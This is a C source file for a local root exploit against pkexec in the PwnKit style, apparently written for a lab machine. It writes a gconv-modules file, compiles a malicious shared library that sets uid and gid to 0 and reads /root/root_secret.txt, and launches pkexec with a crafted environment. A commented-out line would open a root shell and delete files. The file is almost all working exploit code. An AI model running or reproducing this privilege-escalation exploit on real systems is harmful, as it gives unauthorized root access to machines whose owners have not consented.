#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	printf(\"into the gconv_init\\n\");\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	// "	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	system(\"cat /root/root_secret.txt\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
    printf("Entering exploit function...\n");

	FILE *fp;
	system("echo 'module UTF-8// PWNKIT// pwnkit 2' > gconv-modules");
    printf("First command executed successfully.\n");

	fp = fopen("pwnkit.c", "w");
	if (fp == NULL) {
        perror("Failed to create pwnkit.c");
        exit(EXIT_FAILURE);
    }
	fprintf(fp, "%s", shell);
	fclose(fp);

	system("gcc pwnkit.c -o pwnkit.so -shared -fPIC");
    printf("Shared library compiled successfully.\n");

	// char *env[] = { "GCONV_PATH=/home/vagrant", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	char *env[] = { "TTT=ttt", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };

    printf("Environment variables set:\n");
	for (int i = 0; env[i] != NULL; i++) {
        printf("  %s\n", env[i]);
    }

	execve("/usr/local/bin/pkexec", (char*[]){NULL}, env);
	perror("execve failed");
	return EXIT_FAILURE;
}
